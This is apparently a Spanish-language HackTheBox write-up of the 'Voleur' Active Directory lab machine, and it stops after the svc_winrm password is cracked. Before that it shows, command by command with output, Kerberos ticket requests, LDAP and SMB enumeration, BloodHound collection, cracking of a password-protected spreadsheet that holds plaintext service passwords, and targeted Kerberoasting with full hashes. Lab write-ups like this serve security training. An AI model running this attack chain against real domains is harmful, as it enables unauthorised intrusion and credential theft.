---
icon: flag
---

# Voleur HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 11:07 EDT
Nmap scan report for 10.10.11.76
Host is up (0.040s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-13 23:07:23Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
636/tcp   open     tcpwrapped
2222/tcp  open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9398/tcp  filtered unknown
49664/tcp open     msrpc         Microsoft Windows RPC
54784/tcp open     msrpc         Microsoft Windows RPC
62110/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
62111/tcp open     msrpc         Microsoft Windows RPC
62123/tcp open     msrpc         Microsoft Windows RPC
62136/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-13T23:08:17
|_  start_date: N/A
|_clock-skew: 8h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.42 seconds
```

Veremos varios puertos interesantes, entre ellos el `SMB`, `WinRM`, etc... Nos muestra un `dominio` llamado `voleur.htb` el cual nos vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           voleur.htb dc.voleur.htb
```

Lo guardamos y seguimos realizando un pequeño `fuzzing` general.

Si leemos la informacion de la maquina de `HTB` veremos que nos proporcionan unas credenciales de `acceso` como en un `pentesting` real:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-14 111628.png" alt=""><figcaption></figcaption></figure>

```
User: ryan.naylor
Pass: HollowOct31Nyt
```

Teniendo estas credenciales vamos a probarlas para obtener un `TGT` pero antes vamos a modificar la zona horaria de nuestra maquina para que este enlazada con la de la maquina victima, ya que muchas veces en este tipo de maquinas vienen errores de este estilo:

```shell
ntpdate voleur.htb
```

Info:

```
2025-10-13 19:18:53.596199 (-0400) +28800.776253 +/- 0.018904 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 28800.776253
```

Una vez establecida la zona horaria de dicha maquina, vamos a probar a lanzar el siguiente comando para intentar obtener el `TGT` del usuario de esta forma:

```shell
impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
```

> NOTA: Tiene que ser de forma seguida, ya que si pasa mucho tiempo entre la maquina y tu maquina dara un error.

Vamos a exportar en la variable de `kerberos` el archivo generado.

```shell
export KRB5CCNAME=ryan.naylor.ccache
```

Ahora vamos a probar por `LDAP` a ver si el usuario esta correctamente autenticado por `kerberos` gracias al archivo exportado/generado con su `TGT`.

```shell
ntpdate voleur.htb ; netexec ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
```

Info:

```
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

Veremos que ha funcionado, por lo que vamos a listar los usuarios gracias a estas credenciales con el `TGT` del archivo mediante `kerberos`.

```shell
ntpdate voleur.htb ; netexec ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --users
```

Info:

```
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
LDAP        voleur.htb      389    DC               [*] Enumerated 11 domain users: voleur.htb
LDAP        voleur.htb      389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                 
LDAP        voleur.htb      389    DC               Administrator                 2025-01-28 15:35:13 0        Built-in account for administering the computer/domain                                                                                                                                                     
LDAP        voleur.htb      389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain                                                                                                                                                   
LDAP        voleur.htb      389    DC               krbtgt                        2025-01-29 03:43:06 0        Key Distribution Center Service Account       
LDAP        voleur.htb      389    DC               ryan.naylor                   2025-01-29 04:26:46 0        First-Line Support Technician                 
LDAP        voleur.htb      389    DC               marie.bryant                  2025-01-29 04:21:07 0        First-Line Support Technician                 
LDAP        voleur.htb      389    DC               lacey.miller                  2025-01-29 04:20:10 4        Second-Line Support Technician                
LDAP        voleur.htb      389    DC               svc_ldap                      2025-01-29 04:20:54 0                                                      
LDAP        voleur.htb      389    DC               svc_backup                    2025-01-29 04:20:36 0                                                      
LDAP        voleur.htb      389    DC               svc_iis                       2025-01-29 04:20:45 0                                                      
LDAP        voleur.htb      389    DC               jeremy.combs                  2025-01-29 10:10:32 0        Third-Line Support Technician                 
LDAP        voleur.htb      389    DC               svc_winrm                     2025-01-31 04:10:12 0
```

Veremos varios usuarios los cuales vamos a meter en una lista de usuarios, simplemente para saber cuales tenemos.

> users.txt

```
marie.bryant
lacey.miller
jeremy.combs
```

Ahora teniendo esa `autenticacion` vamos a provecharla para volcarnos la informacion con `BloodHound` de esta forma:

## BloodHound

Vamos ha descargarnos en un `ZIP` la informacion del dominio para luego pasarsela a `BloodHound`.

```shell
ntpdate voleur.htb ; bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -ns <IP> -c All -d voleur.htb --zip
```

Info:

```
2025-10-14 10:20:53.328109 (-0700) +2.407339 +/- 0.013692 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 2.407339
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20251014102053_bloodhound.zip
```

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `ryan.naylor` a ver que tiene.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-14 112653.png" alt=""><figcaption></figcaption></figure>

Vemos que el usuario `ryan.naylor` es del grupo `FIRST-LINE-TECHNICIANS` y este a su vez:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-14 112835.png" alt=""><figcaption></figcaption></figure>

Vemos que este grupo tiene los privilegios `WriteOwner, WriteDACL, GenericWrite` respecto al grupo de `Administradores`, esto es muy interesante, pero no podemos hacer nada respecto a dicho grupo simplemente pertenecemos a el, vamos a enumerar los recursos compartidos del `SMB`:

```shell
ntpdate voleur.htb ; netexec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

Info:

```
2025-10-14 10:38:00.846037 (-0700) +3.138291 +/- 0.013889 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 3.138291
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

Veremos un recurso llamado `IT` en el cual podemos entrar, vamos a ver que hay dentro de esta forma:

```shell
impacket-smbclient -k -no-pass @dc.voleur.htb
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
#
```

Veremos que ha funcionado, vamos a listar las carpetas compartidas y meternos dentro del `IT`.

```shell
shares
```

Info:

```
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
```

Ahora usaremos el `IT` de esta forma:

```shell
use IT
ls
```

Info:

```
drw-rw-rw-          0  Wed Jan 29 01:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 13:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 01:40:17 2025 First-Line Support
```

Si nos movemos dentro de dicha carpeta...

```shell
cd First-Line Support
ls
```

Info:

```
drw-rw-rw-          0  Wed Jan 29 01:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 01:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 15:23:36 2025 Access_Review.xlsx
```

Vamos a descargarnos dicho archivo a ver que vemos dentro del mismo:

```shell
get Access_Review.xlsx
```

Ahora vamos a salirnos con `exit` y leer el archivo a ver que contiene, pero si lo intentamos leer veremos que esta encriptado, por lo que vamos a intentar `crackearlo`:

```shell
office2john Access_Review.xlsx > hash.xlsx
john --wordlist=<WORDLIST> hash.xlsx
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:02 DONE (2025-10-14 10:46) 0.4273g/s 341.8p/s 341.8c/s 341.8C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, vamos a utilizar dicha contraseña para decodificarlo y ver que contiene.

```shell
apt install python3-msoffcrypto-tool
msoffcrypto-tool Access_Review.xlsx decrypted.xlsx -p "football1"
apt install xlsx2csv
xlsx2csv decrypted.xlsx output.csv
cat output.csv
```

Info:

```
User,Job Title,Permissions,Notes
Ryan.Naylor,First-Line Support Technician,SMB,Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
Marie.Bryant,First-Line Support Technician,SMB,
Lacey.Miller,Second-Line Support Technician,Remote Management Users,
Todd.Wolfe,Second-Line Support Technician,Remote Management Users,Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
Jeremy.Combs,Third-Line Support Technician,Remote Management Users.,Has access to Software folder.
Administrator,Administrator,Domain Admin,Not to be used for daily tasks!


Service Accounts,,,
svc_backup, ,Windows Backup,Speak to Jeremy!
svc_ldap,,LDAP Services,P/W - M1XyC9pW7qT5Vn
svc_iis,,IIS Administration,P/W - N5pXyW1VqM7CZ8
svc_winrm,,Remote Management ,Need to ask Lacey as she reset this recently.
```

Veremos informacion muy valiosa:

> INFO

```
svc_ldap: M1XyC9pW7qT5Vn
svc_iis: N5pXyW1VqM7CZ8
svc_winrm: (Lacey lo reseteó recientemente)
```

Vemos que con el usuario `svc_ldap` podemos hacer esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-14 115806.png" alt=""><figcaption></figcaption></figure>

Podremos de alguna forma tener permisos de `GenericWrite` sobre el usuario `LACEY.MILLER`.

Vamos a realizar lo siguiente, obtendremos un `TGT` del usuario `svc_ldap` para poder utilizarlo:

```shell
ntpdate voleur.htb ; impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'
```

Info:

```
2025-10-14 11:08:21.053988 (-0700) +1.847824 +/- 0.014614 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 1.847824
/home/kali/Desktop/voleur/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
```

Una vez generado esto, vamos a exportarlo en nuestra variable de `kerberos`.

## Escalate user svc\_winrm

```shell
export KRB5CCNAME=svc_ldap.ccache
```

Ahora vamos a probarlo haciendo lo siguiente:

```shell
ntpdate voleur.htb ; netexec smb dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --shares
```

Info:

```
2025-10-14 11:10:47.631147 (-0700) +1.159117 +/- 0.014326 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 1.159117
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

Veremos que funciona, por lo que vamos a realizar un `kerberoasting` sobre los usuarios con este usuario, vamos a descargarnos de un repo la herramienta que vamos a utilizar.

URL = [GitHub TargetedKerberos Herramienta](https://github.com/ShutdownRepo/targetedKerberoast)

```shell
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast/
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
ntpdate voleur.htb ; python3 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
```

Info:

```
2025-10-14 11:20:10.279652 (-0700) +6.822437 +/- 0.013789 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 6.822437
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$f3df2e24c4527b1619500f5e35029595$97de9b8c002d3b90b1675ad421fc8bc433a2f9a9ddf6123d613c0fa0d057cb617bd6ba688023824cc2f44ed0607d9116ae0e0ad692d47f5b88fb7b394829ff16e081118a90f72088bc76d716f2530cfdf122a10dc5b44f33c2855705872e0713e37bc0883f8ec42b20678ca56fbe00bb38b1445b72e7e0049396b8998f460437cf3ca1ee3be927412820f88fac4db3ed2d2f7314bc8a57caac5ee5484ead8b21947b7a7734f107d744efe2b328ed4456318685768a90d7cc305e220716bdfa13048ecf3a00c3764c1e6f402ed5f95f4b40bbfd5a4954a56c24653acb3f76df9a996efe3948341b2bb22c78f8eaf0b5cd05f6e4903a0bc5d23fea8e633afbcda3acab7ecae5ad5757f431f6fb73f0db3602edad51e4c1c9e0b1e4e76cf246412ca525337c596aded8d5b024bb5135ba7c437625f62e1cd7845c4f3aca7fcda01ebd07226439b922161c413cacc0517fbdbe5dfa370850c45b7ce00e145036510da4d4adb3a1b5d49c7160287f7372aea8a81fce1b465065fc3ac04d1707a60eed74a072097f9ffb6daed06a1aca13a0f4efcbd3f3ad5161ab11dc7c5a78e1ba5dce3b5f2190ed07168869692fd08c6bd45debcf5ecfcf54908c16a473f6f983ee46a9b6ef2cd6025844ee4f86cedb6f96b6cb597471fafea4839287967a6d5130782617627e4bb2719b7fe1fa47cd64255213cc4f8ec65e5588ae9833c3e3db2d7bff3132ce45735a7330f93d4d12026d5d2c67aabaca2e9320ab2cc927056268b98c2dd52d3cb6d985cc1ff08160e39ae61ab379c9c9a505bf462047c69822576d8c5a256657928879f3f0111d935873e6944759da406a0e70ada77fc4ac380343509dc02097ab24b7add49d7f27f123bd29005c0eb3e9d9f960f8fb0a28c02cf31d17d0b68bdb5ea5627a3c4ba20bf374d2539e79324dc00ff94a6e9cd3441ccab0d8814790229390fc70d376f969060d2ed3462d5d16c7568472f0c0b1bd66ef3b9d33149f411c32d98d9f2d4d19cc409da93ff0de17ed515f7a8b49da1b18a343027ef30206d0c0343d5f57a29143985f3fd0ed8d5981c45b421cfabcc99b3b90944f1e4ca88138cfa09b74b9499d56feb5621db27882c4b3cd6617a85cbc1130434b3e94f9f6e952d155ca58229f5adb207fc4f68cd2d6ed71d10318a29e498dced5ceb73f1ec5a77da370cc49b8444b099ccf033b1c11878354b86d33ac6ccb69efb018adea5962d68eca3bd5164109256958189cf9df85f26388c1f9e9fe87edd8fbd2870763df806306ebb79e4bc4bd20d7d098b307c0f26b7c8aa9adbbd2a2491b2a9e17e70a182aa2bd98051b54752c8d4a7663b3d7d1198b6909ac41aa4582a1de403d59367c612aa1aeede71b232c12b4a185fd361cc777349244e061b73b025f8dcda6aade64c50dba60cb45f47168033d3f3828cef962a74603f0c61bdc258d92417c7ff388021522eba76933
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$d5aca53a83bc4cd235400486d000f433$f1f8e831719c001221d95bd35867e4b11e8b3f99e8c79d075693913039ea66bb607c82d86ff87e288c94c8653c7c9bfb8e7677f4cb0092b108e2c4b494bcc99f272f8b5a8897afe9e099366fbf1701c717a6f6682fe2e487c4308f64bf01068940f4fce3db4ee5d3805ae1ec4538fb97671a275d0706080fe491a63da1720cfb652e029528542eaf2e26349ee40ad3edb3bb3c6c3ade43b1bfb79364a7c3b006265d8ba64ae4e5d3a8b4900595864f9d720c5273410085f480f598c81bf56ee828a2f3fdf138171637ab911f49555b02dcb9921145898baf2b5be3c470e4f6638169b2dbc30f2987ee69c8cf640e6619835b4912694e3ab5bc09e5ee80ac8205d8b70bf368b6494f0835e1011a306b372404f55c3d40ce97bc3d9f0f4a297e6356c3ce7f6ec417ef8d7fd8873acbe463d2e5f54ad8b1291f34f22f5a4ce934390f6dafffb7b9cd85d9c2cd4b019454c5f7ea5e07da891ddaaf823816bf73d188c8102b2a5147ef22cba72c983d4e47e820073e24ce69427977131c14fb19be1f669a99feb9197bb28a57c63d5fef78118203e3b7516f98bedfcbcb320c0481f7e35e1a2a1e61a82cfbf5df150b4e412769fb632869b422b748b931e456af14d023f528aabc4d354def087fed973ec49cbd47a04fee0e0cda28f6076fe4a919f8fe4db602c36b7990a3a470ac21bae6b0ac68df70fdef33dc96f1eb24f1d51b4d4f70e3d5efa17e44bc4184b22cd26baa35a1d6afd9d511cdc3537d4be165a5b7815de9d0cb190f83347dd4d7e5c7800323c8187ca5e2ce0d3a845703f0150dd6cae422494ba864a35229e7410e0d18711eb5c35a1d52036ca208524d31f81117ff45500c4c07e27ff402135cbb2b2177e9810755b7dd767ee0e2d944fb33109bcb30fbd4ba092ab6580fa9551fa951704d2bfd9256c6f04e0e2d62b41e3e7fc29b758f680a35bc87a1890a02e2f81630bfa88d9de183584744235b2ae83a8de61f8038b0f31e77f39aa81ee3d5b2a97762918fa764c954d737d3552a03c05a41b41a7336c21005abd6486fabaeefb2c7cf8b365b1fc79cfb5b1e06876c41305b8847b530273fd3674c427243f7ebd5548d56807cca7d4febace4c706e06b180b2336597925f45834fb53d9e8f89f7769c8627230c516c3d6e5c2ac499dead50ed7fbd96230495a78da3da2a7b31e26b3e21d39603c166acb4e843c876b51b5f1bf8affb60ad01f34886261fa92f7e31fe1e45cbc3ac66b6c1e7c807c852705293f77385e22de2f804b6b4d319f4e04d2925095d9bbcaa56b04778eec21bbe653b1d55ad687d8c825f2b732c09eda07dcf8a611f32f4a578ece323525c0912074ccb311ffb33eefea85ae83870e6812945f6f0b139916b05cc4bc9d86e3961a792438978f1ef461bdf40fdc422ada5dc4176b1859b41f240bf7ddc18043acb02a74d4328d00bf544e60998470f2997f75212bd6
```

Veremos que ha funcionado, hemos obtenido los `hashes TGT` de los usuarios `svc_winrm` y `lacey.miller`, por lo que vamos a probar lo siguiente:

Vamos a guardar los `hashes` en un archivo.

> hash.lacey.miller

```
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$f3df2e24c4527b1619500f5e35029595$97de9b8c002d3b90b1675ad421fc8bc433a2f9a9ddf6123d613c0fa0d057cb617bd6ba688023824cc2f44ed0607d9116ae0e0ad692d47f5b88fb7b394829ff16e081118a90f72088bc76d716f2530cfdf122a10dc5b44f33c2855705872e0713e37bc0883f8ec42b20678ca56fbe00bb38b1445b72e7e0049396b8998f460437cf3ca1ee3be927412820f88fac4db3ed2d2f7314bc8a57caac5ee5484ead8b21947b7a7734f107d744efe2b328ed4456318685768a90d7cc305e220716bdfa13048ecf3a00c3764c1e6f402ed5f95f4b40bbfd5a4954a56c24653acb3f76df9a996efe3948341b2bb22c78f8eaf0b5cd05f6e4903a0bc5d23fea8e633afbcda3acab7ecae5ad5757f431f6fb73f0db3602edad51e4c1c9e0b1e4e76cf246412ca525337c596aded8d5b024bb5135ba7c437625f62e1cd7845c4f3aca7fcda01ebd07226439b922161c413cacc0517fbdbe5dfa370850c45b7ce00e145036510da4d4adb3a1b5d49c7160287f7372aea8a81fce1b465065fc3ac04d1707a60eed74a072097f9ffb6daed06a1aca13a0f4efcbd3f3ad5161ab11dc7c5a78e1ba5dce3b5f2190ed07168869692fd08c6bd45debcf5ecfcf54908c16a473f6f983ee46a9b6ef2cd6025844ee4f86cedb6f96b6cb597471fafea4839287967a6d5130782617627e4bb2719b7fe1fa47cd64255213cc4f8ec65e5588ae9833c3e3db2d7bff3132ce45735a7330f93d4d12026d5d2c67aabaca2e9320ab2cc927056268b98c2dd52d3cb6d985cc1ff08160e39ae61ab379c9c9a505bf462047c69822576d8c5a256657928879f3f0111d935873e6944759da406a0e70ada77fc4ac380343509dc02097ab24b7add49d7f27f123bd29005c0eb3e9d9f960f8fb0a28c02cf31d17d0b68bdb5ea5627a3c4ba20bf374d2539e79324dc00ff94a6e9cd3441ccab0d8814790229390fc70d376f969060d2ed3462d5d16c7568472f0c0b1bd66ef3b9d33149f411c32d98d9f2d4d19cc409da93ff0de17ed515f7a8b49da1b18a343027ef30206d0c0343d5f57a29143985f3fd0ed8d5981c45b421cfabcc99b3b90944f1e4ca88138cfa09b74b9499d56feb5621db27882c4b3cd6617a85cbc1130434b3e94f9f6e952d155ca58229f5adb207fc4f68cd2d6ed71d10318a29e498dced5ceb73f1ec5a77da370cc49b8444b099ccf033b1c11878354b86d33ac6ccb69efb018adea5962d68eca3bd5164109256958189cf9df85f26388c1f9e9fe87edd8fbd2870763df806306ebb79e4bc4bd20d7d098b307c0f26b7c8aa9adbbd2a2491b2a9e17e70a182aa2bd98051b54752c8d4a7663b3d7d1198b6909ac41aa4582a1de403d59367c612aa1aeede71b232c12b4a185fd361cc777349244e061b73b025f8dcda6aade64c50dba60cb45f47168033d3f3828cef962a74603f0c61bdc258d92417c7ff388021522eba76933
```

> hash.svc\_winrm

```
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$d5aca53a83bc4cd235400486d000f433$f1f8e831719c001221d95bd35867e4b11e8b3f99e8c79d075693913039ea66bb607c82d86ff87e288c94c8653c7c9bfb8e7677f4cb0092b108e2c4b494bcc99f272f8b5a8897afe9e099366fbf1701c717a6f6682fe2e487c4308f64bf01068940f4fce3db4ee5d3805ae1ec4538fb97671a275d0706080fe491a63da1720cfb652e029528542eaf2e26349ee40ad3edb3bb3c6c3ade43b1bfb79364a7c3b006265d8ba64ae4e5d3a8b4900595864f9d720c5273410085f480f598c81bf56ee828a2f3fdf138171637ab911f49555b02dcb9921145898baf2b5be3c470e4f6638169b2dbc30f2987ee69c8cf640e6619835b4912694e3ab5bc09e5ee80ac8205d8b70bf368b6494f0835e1011a306b372404f55c3d40ce97bc3d9f0f4a297e6356c3ce7f6ec417ef8d7fd8873acbe463d2e5f54ad8b1291f34f22f5a4ce934390f6dafffb7b9cd85d9c2cd4b019454c5f7ea5e07da891ddaaf823816bf73d188c8102b2a5147ef22cba72c983d4e47e820073e24ce69427977131c14fb19be1f669a99feb9197bb28a57c63d5fef78118203e3b7516f98bedfcbcb320c0481f7e35e1a2a1e61a82cfbf5df150b4e412769fb632869b422b748b931e456af14d023f528aabc4d354def087fed973ec49cbd47a04fee0e0cda28f6076fe4a919f8fe4db602c36b7990a3a470ac21bae6b0ac68df70fdef33dc96f1eb24f1d51b4d4f70e3d5efa17e44bc4184b22cd26baa35a1d6afd9d511cdc3537d4be165a5b7815de9d0cb190f83347dd4d7e5c7800323c8187ca5e2ce0d3a845703f0150dd6cae422494ba864a35229e7410e0d18711eb5c35a1d52036ca208524d31f81117ff45500c4c07e27ff402135cbb2b2177e9810755b7dd767ee0e2d944fb33109bcb30fbd4ba092ab6580fa9551fa951704d2bfd9256c6f04e0e2d62b41e3e7fc29b758f680a35bc87a1890a02e2f81630bfa88d9de183584744235b2ae83a8de61f8038b0f31e77f39aa81ee3d5b2a97762918fa764c954d737d3552a03c05a41b41a7336c21005abd6486fabaeefb2c7cf8b365b1fc79cfb5b1e06876c41305b8847b530273fd3674c427243f7ebd5548d56807cca7d4febace4c706e06b180b2336597925f45834fb53d9e8f89f7769c8627230c516c3d6e5c2ac499dead50ed7fbd96230495a78da3da2a7b31e26b3e21d39603c166acb4e843c876b51b5f1bf8affb60ad01f34886261fa92f7e31fe1e45cbc3ac66b6c1e7c807c852705293f77385e22de2f804b6b4d319f4e04d2925095d9bbcaa56b04778eec21bbe653b1d55ad687d8c825f2b732c09eda07dcf8a611f32f4a578ece323525c0912074ccb311ffb33eefea85ae83870e6812945f6f0b139916b05cc4bc9d86e3961a792438978f1ef461bdf40fdc422ada5dc4176b1859b41f240bf7ddc18043acb02a74d4328d00bf544e60998470f2997f75212bd6
```

Si probamos con el usuario `svc_winrm` veremos lo siguiente:

```shell
john --format=krb5tgs --wordlist=<WORDLIST> hash.svc_winrm
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:02 DONE (2025-10-14 11:24) 0.4081g/s 4682Kp/s 4682Kc/s 4682KC/s AHANACK6978012..ADRIANAH
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

